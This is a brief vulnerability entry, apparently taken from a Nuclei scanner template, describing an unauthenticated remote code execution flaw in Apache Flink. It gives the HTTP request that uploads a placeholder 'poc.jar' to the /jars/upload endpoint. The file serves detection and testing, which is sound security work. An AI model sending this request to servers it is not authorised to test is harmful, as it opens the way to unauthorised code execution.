# Vulnerability: Apache Flink - Remote Code Execution
**Classification:** CWE-94,CWE-434
**Source:** Nuclei Template (`apache-flink-unauth-rce.yaml`)

## Description
Apache Flink contains an unauthenticated remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /jars/upload HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3

--8ce4b16b22b58894aa86c421e8759df3
Content-Disposition: form-data; name="jarfile";filename="poc.jar"
Content-Type:application/octet-stream

  {{randstr}}
--8ce4b16b22b58894aa86c421e8759df3--
```

